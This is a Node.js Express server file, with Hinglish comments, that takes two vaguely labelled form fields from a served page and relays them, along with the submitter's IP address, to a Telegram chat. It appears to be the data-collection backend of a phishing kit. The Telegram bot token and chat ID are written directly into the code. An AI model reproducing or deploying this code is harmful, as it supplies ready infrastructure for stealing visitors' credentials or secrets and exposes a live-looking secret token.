const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Render ke Environment Variables se aayega
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '9033951265:AAHXcKT65JVYFCq-aRiCvCDIllmNrYfFUSU';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1278128855';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', async (req, res) => {
    const { fieldA, fieldB } = req.body;

    if (!fieldA || !fieldB) {
        return res.status(400).json({ success: false, message: 'Both fields are required.' });
    }

    // Telegram Message Format
    const message = `🔔 *New Form Submission*\n\n` +
                    `📝 *Block A:* \`${fieldA}\`\n` +
                    `📝 *Block B:* \`${fieldB}\`\n\n` +
                    `🌐 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}`;

    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();
        if (data.ok) {
            res.json({ success: true, message: 'Data sent to Telegram!' });
        } else {
            res.status(500).json({ success: false, message: 'Telegram API Error.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal Server Error.' });
    }
});

// Frontend serve karega
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
